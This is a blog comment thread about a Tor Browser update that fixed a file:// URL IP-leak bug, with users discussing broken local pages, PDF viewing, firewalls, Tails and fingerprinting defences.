This is wrong, **I use it for opening PDF files instead of using the pdf reader in my system who can leak my IP address**. Please never make sweeping generalization until you have a good idea about the use cases of other people.

My problem has nothing to do with clicking on links, the workaround for that works perfectly fine.

What I'm talking about is the fact that when I open my local webpage using file:///path-to-local-webpage/index.html in the url bar I see errors in the console like

ReferenceError: $ is not defined

and

NetworkError: A network error occurred

The local webpage used to work like a charm without any warnings/errors in the console so this update is clearly breaking more than just links.

### [I suggest to remove the â¦](#comment-272354)

I suggest to remove the "file://" support and (!) in-browser pdf functionality from Torbrowser.

About a more than half a year ago, someone asked on this blog how safe the "file://" functionality was, answer; safe.

While it is not.

Your browser should not have this functionality because it is for browsing online and not for browsing on your computer.

Regarding pdf, we all know that pdf's are widely used for (malware) attacks, also in combination with webbugs. So it is a bad idea to use your browser for opening pdfs.

Especially when you realize that probably the most of Torbrowser users don't have the functionality enabled to use Torbrowser as their standard browser (and there you go, well actually the pdf-webbug).

Pdf reader leaking tricks? If you use the well known pdf reader from that company than also is the largest tracking company in the world (2o7.net, .. anyone?) you should at least take some time to just look at the preferences of your program (actually you should do that with all the programs you use (!).

Disable any extra functionality that has to do with connecting to the internet and disable embedded script functions.

But probably better is to make sure that your firewall is configured well, do not white list the pdf readers (among many others, work with monitored whitelisting, etc.)

The best off course I can think of is to just own a Tails distribution, and use that when needed.

Unfortunately the mozilla bug is protected so we do not know how it works, which computer process was leaking the ip address?

Could it have been avoided when the process was not on the whitelist of your (extra) firewall config?

Using Torbrowser is a very nice standard protection in defence towards tracking companies, but if you really care about not giving away your ip address then it is probably essential to work with a firewall to prevent (all time populair) webbugs triggering other computer/program processes to connect with the internet directly. (Usual suspects, your Office program, your Pdf reader, your media player, your real standard browser (!)).

And off course to protect yourself from malware attacks, because most malware is not coming right away along as malware but usually need at least another step to fetch the real malware from the internet.

That process does probably not (always) succeed with a firewall blocking that new connection.

Torbrowser, very nice.

Extra firewall? Absolutely necessary to protect your safety and privacy (more).

Use at least Torbrowser + firewall program.

Use them both I should say.

And I hope that we get to know which extra computer process was activated to connect with the internet with this bug, so we can protect ourself and not being completely dependent on Torproject.

Second that!

TBB is my default Linux browser, and I had to stand on my head to make it so. I keep a lot of hypertext documentation on my local hard drive and view it with the default browser.

Among other things I display weather statistics from my own weather station. The \*weewx\* package creates \*.html documents on my local hard drive on a schedule. I've had to switch to \*iceweasel\* to see them. These weather pages potentially contain links to other Web-based resources. I guess I'll just have to remember I'm not using a hardened browser while visiting those.

Oh and what about your sweeping generalsomething? Last time I checked TB isn't a magic panacea. You like to use TB to look at PDF instead of sand-boxing that shit? How's that sane? You trust code written for public internet use (which has been re-purposed admirably for flexibility with tor network) to look at pdf (PDF!?) securely? If you cannot allocate some more memory to that crappy vm you run or sandbox a separate document reader process then you shouldn't criticize someone for giving a damn about TB's security.

Hasn't TB retained the ability to load local server addresses (with modification)? I haven't checked because I like to separate control. If so then why keep file:/// support at all, just a moving landmine.

It could be any number of things. Perhaps it involved interacting with some character device, which would explain why it affects Linux and OSX, but not Windows. Like the file URI parsing code is probably identical between Linux, OSX, and Windows versions of Firefox. The majority of the code is operating system agnostic, so the fact that it only affects \*nix systems strongly narrows down the possibilities.

While I don't know for sure and can only speculate, my best guess is that it is related to the browser accessing a character device or something similar, since that's the only big difference between the behavior of their filesystem layouts. It wouldn't be a bug in the URL parsing code because the vast majority of code between Firefox for different operating systems is the same. I would be surprised if there were any significant difference between the Linux/OSX and Windows versions when it comes to file parsing.

### [first think about how localâ¦](#comment-272490)

first think about how local addresses can be exploited to leak in tor browser, they are blocked by default for a reason, and require your action to enable. second think about where files are located when invoking file:// urls and where the code which handles it is located.

from the wording it clearly impacts the local.file:// usage not when files are viewed on the server

so how to exploit? convince you to open a file://url to a local file (convince you to download it before), the file is formed to include remote assets possibly including identifiers to track back. when loaded via file:// local file runs local address and by default may not always obey proxy as local addresses tend to not traverse gateway.

not deliberate or malicious in design, but kind of like trying to compel adobe flash to obey proxy with jedi mind tricks

- still the same insecure settings : ssl/tls - i understand that an user -lambda- needs surfing everywhere & quickly without hassle but it does not suit me (it is NOT a safe browsing & compromises my surf & login).

conclusion : it becomes too much ambiguous : security vs anonymity / security OR anonymity

Good thing local TV news reported about a new Tor Browser release, because version 7.0.5 (Linux, 32-bit) never warned me about any available updates. That's BAD.

I got 7.0.5 as an automatic update on a previous Tor Browser version.

7.0.9 too, I used the in-browser update mechanism. Too bad 7.0.5 never warned me there was an update.

### [You really don't have toâ¦](#comment-272435)

You really don't have to worry about that when it comes to Tails. Let's go through each of the fingerprinting methods in turn, from the bleepingcomputer article in that blog post:

1) Screen Resolution - Tails will automatically start Tor Browser with a standard resolution. It even warns you if you try to resize the browser in a way that would give away your screen resolution.

2) Number of CPU Virtual Cores - If I remember correctly, Tor Browser blocks the hardwareConcurrency function. Even if it doesn't, this is a rather limited signature on its own.

3) AudioContext - Tor Browser has recently fixed this issue.

4) List of Fonts - This only allows distinguishing the broad class of operating system. For Tails, it merely tells someone that you are using Linux. Tails doesn't attempt to hide the fact that it is Tails, either, as their version of Tor Browser is unique to Tails (but still indistinguishable among different Tails users).

5) Line, Curve, and Anti-aliasing - This requires WebGL, which Tor Browser disables.

6) Vertex Shader - This requires WebGL, which Tor Browser disables.

7) Fragment Shader - This requires WebGL, which Tor Browser disables.

8) Transparency via Alpha Channel - This requires WebGL, which Tor Browser disables.

9) Installed Writing Scripts (Languages) - Tor Browser defaults to English to avoid this issue.

10) Modeling and Multiple Models - This requires WebGL, which Tor Browser disables.

11) Lighting and Shadow Mapping - This requires WebGL, which Tor Browser disables.

12) Camera - This requires WebGL, which Tor Browser disables.

13) Clipping Planes - This requires WebGL, which Tor Browser disables.

Nobody said we'll never use that feature to do X. Moreover, \*just\* configuring Tor Browser to use AF\_UNIX sockets would not have helped in this case. That proxy setting would have got bypassed, as well. So, there is more we would need and how to do that best for \*all\* OS X and Linux users still needs to get figured out it seems. I think that's important, don't get me wrong. But it's not done by just entering different proxy details into the browser settings.

### [Due to a Firefox bug inâ¦](#comment-272401)

> Due to a Firefox bug in handling file:// URLs it is possible on both systems that users leak their IP address

Could you tell in which TBB version this bug first appeared?

There are some news about [recent](http://theantimedia.org/dark-web-pedophile-site-secretly-run-by-police/) busts, where police was running one onion HS during 11 months. Later [95,000](https://www.vg.no/nyheter/innenriks/kampen-mot-overgrepsfiler/this-map-shows-95-000-downloaders-of-child-abuse-pictures-worldwide/a/23535650/) IP addresses were discovered:

> We have seen in several hidden forums that they recommend certain file-sharing services, and this discussion may happen not just on the Internet. One can therefore look at this world map as a representation of several geographic networks of downloaders

Can this 95,000 IP leak be related to this TBB bug? It is written that

> The information is gathered from activities logged from a small number of file-sharing services which are preferred by people who share this kind of material.

However, if people are in "hidden" (tor) sites that rely on tor, all files are usually downloaded in the same browser that also uses tor. Is it meaningful that 95,000 people used their normal browser to download files faster without tor?

uBlock Origin

It looks like that if you use the uBlock Origin addon like the Tails version of Torbrowser does that "wss://" websockets are blocked.

Why does Torproject not embed the uBlock Origin addon as well in Torbrowser?

I see, I see also filter list functions in Noscript and https Everywhere (one big list but not covering many websites too), but not a special function in Noscript that protects the user from unwanted functionality in the browser like the ones discussed in this topic.

Therefor the ublock addon seemed to be a reasonable solution because it does block this, it is also used by TAILS and above all it seems that we cannot rely on the continuous changes that firefox has with functionality that no one really wants and is creating security and privacy problems for at least 3 years now. Mac users probably better can use TAILS because their support is far more broader and reliable then mozilla offers.

Thank you for answering anyway

So is this problem caused by file:// being handled in the context of the host, local address? We've been here before, similar to the problem with allowing unfettered local address access, in that it can bypass the proxy... only in the case of local address access the useful situation exists.
